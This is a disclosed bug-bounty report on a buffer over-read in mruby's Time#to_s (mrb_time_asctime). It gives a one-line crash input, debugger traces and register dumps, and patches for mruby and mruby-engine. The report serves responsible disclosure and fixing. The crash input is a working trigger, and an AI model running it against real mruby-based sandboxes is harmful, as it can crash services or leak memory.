# Buffer overflow in mrb_time_asctime

## Report Details
- **Report ID**: 188326
- **URL**: https://hackerone.com/reports/188326
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-12-05T04:03:11.187Z
- **Disclosed**: 2016-12-18T13:22:13.113Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

This one doesn't always crash every time, but with ASAN on it will.

Crash file is:

```
Time.new-0XD00000000000000&0
```

But you could always do `Time.at(sec,usec)` with special values, and basically anything that gets to_s called (`mrb_time_asctime` in C) (in this case, no method found exception does this).

Crashes sometimes in mruby:

```
 $ ./dev/bin/mruby crash.rb
Segmentation fault: 11

```

The times it doesn't crash, it could either return strings outside of memory with a buffer-overead. Some of the lldb runs shows this:

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 66222 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)
Process 66222 exited with status = 1 (0x00000001)
(lldb) r
Process 66665 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66665 exited with status = 1 (0x00000001)
(lldb) r
Process 66889 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 66889 exited with status = 1 (0x00000001)
(lldb) r
Process 67075 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 01 16:03:04 1900 (NoMethodError)
Process 67075 exited with status = 1 (0x00000001)
(lldb) r
Process 67127 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun _defined? 486 16:03:04 2259 (NoMethodError)
Process 67127 exited with status = 1 (0x00000001)
(lldb) r
Process 67341 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 04 16:03:04 1900 (NoMethodError)
Process 67341 exited with status = 1 (0x00000001)
(lldb) r
Process 67904 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 67904 exited with status = 1 (0x00000001)
(lldb) r
Process 68098 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 68098 exited with status = 1 (0x00000001)
(lldb) r
Process 68320 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  01 16:03:04 1900 (NoMethodError)
Process 68320 exited with status = 1 (0x00000001)
(lldb) r
Process 68514 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 68514 exited with status = 1 (0x00000001)
(lldb) r
Process 68628 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun ) 62 16:03:04 1983 (NoMethodError)
Process 68628 exited with status = 1 (0x00000001)
(lldb) r
Process 68870 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)
Process 68870 exited with status = 1 (0x00000001)
(lldb) r
Process 68908 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun  01 16:03:04 1901 (NoMethodError)
Process 68908 exited with status = 1 (0x00000001)
(lldb) r
Process 69130 launched: './dev/bin/mruby' (x86_64)
trace:
        [0] crash.rb:1
crash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)
Process 69130 exited with status = 1 (0x00000001)
(lldb) r
Process 69324 launched: './dev/bin/mruby' (x86_64)
Process 69324 stopped
* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)
    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
libsystem_c.dylib`strlen:
->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0
    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi
    0x7fff95b0e15a <+26>: andq   $0xf, %rcx
    0x7fff95b0e15e <+30>: orq    $-0x1, %rax
(lldb) bt
* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)
  * frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
    frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713
    frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669
    frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596
    frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80
    frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128
    frame #6: 0x000000010004f15a mruby`mrb_time_asctime + 282
    frame #7: 0x000000010003cf0b mruby`mrb_funcall_with_block + 1515
    frame #8: 0x000000010003c901 mruby`mrb_funcall_argv + 113
    frame #9: 0x000000010000c023 mruby`mrb_method_missing + 275
    frame #10: 0x000000010000da7b mruby`mrb_bob_missing + 123
    frame #11: 0x000000010003fc13 mruby`mrb_vm_exec + 6739
    frame #12: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #13: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #14: 0x0000000100071adf mruby`load_exec + 1183
    frame #15: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #16: 0x00000001000017d8 mruby`main + 904
    frame #17: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x00000000ffffffff
       rbx = 0x00000000ffffffff
       rcx = 0x000000014010ef38
       rdx = 0x000000014010ef38
       rdi = 0x000000014010ef30
       rsi = 0x00007fff95b52eb9  libsystem_c.dylib`__vfprintf + 2742
       rbp = 0x00007fff5fbfbca0
       rsp = 0x00007fff5fbfbca0
        r8 = 0x0000000000000003
        r9 = 0x000000010007f803  "%s %02d %02d:%02d:%02d %s%d"
       r10 = 0x00007fffa10cd401
       r11 = 0x00007ffe5fb713a0
       r12 = 0x000000010007f805  " %02d %02d:%02d:%02d %s%d"
       r13 = 0x0000000000000073
       r14 = 0x0000000000000073
       r15 = 0x0000000000000003
       rip = 0x00007fff95b0e152  libsystem_c.dylib`strlen + 18
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

With some symbols compiled in:

```
$ lldb ./mruby/bin/mruby crash.rb
(lldb) target create "./mruby/bin/mruby"
Current executable set to './mruby/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 1457 launched: './mruby/bin/mruby' (x86_64)
Process 1457 stopped
* thread #1: tid = 0x88ab040, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x101946780)
    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18
libsystem_c.dylib`strlen:
->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0
    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi
    0x7fff95b0e15a <+26>: andq   $0xf, %rcx
    0x7fff95b0e15e <+30>: orq    $-0x1, %rax
(lldb) up
frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713
libsystem_c.dylib`__vfprintf:
    0x7fff95b53a54 <+5713>: movq   %rax, -0x2f8(%rbp)
    0x7fff95b53a5b <+5720>: movb   $0x0, -0x18f(%rbp)
    0x7fff95b53a62 <+5727>: movl   $0x0, -0x304(%rbp)
    0x7fff95b53a6c <+5737>: movl   %r14d, %r13d
(lldb) up
frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669
libsystem_c.dylib`__v2printf:
    0x7fff95b7c6c9 <+669>: movl   %eax, %ebx
    0x7fff95b7c6cb <+671>: jmp    0x7fff95b7c718            ; <+748>
    0x7fff95b7c6cd <+673>: callq  0x7fff95b91fe4            ; symbol stub for: __error
    0x7fff95b7c6d2 <+678>: movl   (%rax), %ebx
(lldb) up
frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596
libsystem_c.dylib`_vsnprintf:
    0x7fff95b60915 <+596>: testq  %rbx, %rbx
    0x7fff95b60918 <+599>: je     0x7fff95b60924            ; <+611>
    0x7fff95b6091a <+601>: movq   -0x1e0(%rbp), %rcx
    0x7fff95b60921 <+608>: movb   $0x0, (%rcx)
(lldb) up
frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80
libsystem_c.dylib`vsnprintf:
    0x7fff95b609ca <+80>: addq   $0x10, %rsp
    0x7fff95b609ce <+84>: popq   %rbx
    0x7fff95b609cf <+85>: popq   %r12
    0x7fff95b609d1 <+87>: popq   %r14
(lldb) up
frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128
libsystem_c.dylib`__snprintf_chk:
    0x7fff95b91d08 <+128>: cmpq   -0x10(%rbp), %rbx
    0x7fff95b91d0c <+132>: jne    0x7fff95b91d1d            ; <+149>
    0x7fff95b91d0e <+134>: addq   $0xd8, %rsp
    0x7fff95b91d15 <+141>: popq   %rbx
(lldb)
frame #6: 0x000000010004e8da mruby`mrb_time_asctime(mrb=0x00000001002029f0, self=mrb_value @ 0x00007fff5fbfc530) + 282 at time.c:506
   503
   504    tm = DATA_GET_PTR(mrb, self, &mrb_time_type, struct mrb_time);
   505    d = &tm->datetime;
-> 506    len = snprintf(buf, sizeof(buf), "%s %s %02d %02d:%02d:%02d %s%d",
   507      wday_names[d->tm_wday], mon_names[d->tm_mon], d->tm_mday,
   508      d->tm_hour, d->tm_min, d->tm_sec,
   509      tm->timezone == MRB_TIMEZONE_UTC ? "UTC " : "",
(lldb) p *tm
(mrb_time) $0 = {
  sec = -936748721012153088
  usec = 105092
  timezone = MRB_TIMEZONE_LOCAL
  datetime = {
    tm_sec = 12
    tm_min = 5
    tm_hour = 16
    tm_mday = 1
    tm_mon = 6484120
    tm_year = 1
    tm_wday = 0
    tm_yday = 1
    tm_isdst = 0
    tm_gmtoff = 1701667182
    tm_zone = 0x000a000000000000 <no value available>
  }
}
(lldb) p *d
(tm) $1 = {
  tm_sec = 12
  tm_min = 5
  tm_hour = 16
  tm_mday = 1
  tm_mon = 6484120
  tm_year = 1
  tm_wday = 0
  tm_yday = 1
  tm_isdst = 0
  tm_gmtoff = 1701667182
  tm_zone = 0x000a000000000000 <no value available>
}
(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Patch to fix would be this:

```
diff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c
index dfd4450..5dc5b34 100644
--- a/mrbgems/mruby-time/src/time.c
+++ b/mrbgems/mruby-time/src/time.c
@@ -238,7 +238,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)
     tm->usec -= 1000000;
   }
   tm->timezone = timezone;
-  mrb_time_update_datetime(tm);
+  if (!mrb_time_update_datetime(tm)) {
+    mrb_raisef(mrb, E_ARGUMENT_ERROR, "%S out of Time range", mrb_float_value(mrb, sec));
+  }
 
   return tm;
 }
```

Which now returns:

```
$ ./mruby/bin/mruby crash.rb
        [0] crash.rb:1
crash.rb:1: -9.3674872101215e+17 out of Time range (ArgumentError)

```


Also affected `mruby-engine`:

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x0000014531cca0
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:000c80 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001810 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x00000000ffffffff rbx: 0x00000000ffffffff rcx: 0x000000014531cca0
 rdx: 0x000000014531cca0 rdi: 0x000000014531cca0 rsi: 0x00007fff95b52eb9
 rbp: 0x00007fff528d0400 rsp: 0x00007fff528d0400  r8: 0x0000000000000003
  r9: 0x000000010dd2a24a r10: 0x00007fffa10cd401 r11: 0x00007ffe44bac7b4
 r12: 0x000000010dd2a24c r13: 0x0000000000000073 r14: 0x0000000000000073
 r15: 0x0000000000000003 rip: 0x00007fff95b0e152 rfl: 0x0000000000010206

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010d4cb5d4 rb_vm_bugreport + 388
1   ruby                                0x000000010d36d023 rb_bug_context + 483
2   ruby                                0x000000010d440653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   libsystem_c.dylib                   0x00007fff95b0e152 strlen + 18
5   ???                                 0x00007fff528d07f0 0x0 + 140734578362352

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

Patch to fix `mruby-engine`:

```
diff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c
index 8884a5d..2b5d770 100644
--- a/ext/mruby_engine/mruby-time/src/time.c
+++ b/ext/mruby_engine/mruby-time/src/time.c
@@ -236,7 +236,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)
     tm->usec -= 1000000;
   }
   tm->timezone = timezone;
-  mrb_time_update_datetime(tm);
+  if (!mrb_time_update_datetime(tm)) {
+    mrb_raisef(mrb, E_ARGUMENT_ERROR, "%S out of Time range", mrb_float_value(mrb, sec));
+  }
 
   return tm;
 }
```

Now returns:

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20:in `sandbox_eval': -9.3674872249306e+17 out of Time range (MRubyEngine::EngineRuntimeError)
        from ./bin/sandbox:20:in `<main>'

```

Cheers,

Hugh

## Attachments
No attachments
